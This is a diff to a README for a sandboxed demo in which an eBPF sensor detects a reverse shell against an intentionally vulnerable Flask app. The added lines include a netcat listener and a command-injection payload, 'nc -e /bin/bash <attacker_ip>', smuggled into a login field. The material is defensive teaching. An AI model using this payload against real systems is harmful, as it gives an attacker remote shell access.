@@ -13,7 +13,8 @@ This project provides a complete sandbox environment for:
 The demo consists of two main components:
 1. **Vulnerable Web Server** - A Python Flask application with intentional command injection vulnerability
 2. **eBPF Sensor** - A kernel-level program that hooks `execve` and `connect` system calls to detect suspicious behavior
-
+   **Attacker** - on your wish
+   
 ## Installation
 
 ```bash
@@ -27,15 +28,18 @@ sudo ./sensor.bt
 # Build the vulnerable container
 docker build -t rce-vuln-app .
 
-# Run the container (Run only in LAN!!!)
+# Run the container (Run only isolation scope!!!)
 docker run -d --rm\
   --name rce-auth-server \
   -p 5000:5000 \  # Web port for our web-server
   rce-vuln-app
 
+# Create nc-server on attack machine
+nc -lvnp 4000
+
 # Attack vunlnable server (input don't shielded)
 curl -X POST http://<rce_server_ip>:5000/ -d /
-"username=; nc -e /bin/bash <attacker_ip> <attacker_port>;&password=test"
+"username=; nc -e /bin/bash <attacker_ip> 4000;&password=test"
 
 # Watch the output of eBPF-sensor
 [ALERT] REVERSE_SHELL_DETECTED
